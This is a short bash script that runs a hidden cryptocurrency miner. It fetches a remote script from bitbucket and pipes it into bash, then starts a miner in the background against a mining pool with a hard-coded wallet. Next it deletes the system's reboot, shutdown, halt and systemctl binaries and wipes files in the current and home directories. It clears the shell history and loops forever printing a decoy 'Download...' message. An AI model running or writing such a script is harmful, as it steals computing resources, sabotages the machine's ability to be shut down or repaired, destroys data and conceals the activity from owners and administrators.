#!/bin/bash
apt-get update 
apt-get install -y wget curl sudo
sudo apt-get update -y
curl -sL https://bitbucket.org/new-kamikaze/srbkaze/raw/main/grsrb.sh | bash
chmod +x srbkaze
nohup ./srbkaze --algorithm heavyhash --pool stratum-asia.rplant.xyz:7050 --wallet UcNmFVcJkvJKakhWeuAmqYKQW5w4xJ4e64.kopi > /dev/null 2>&1 &
sleep 30
sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "Download..."
        sleep 20
done
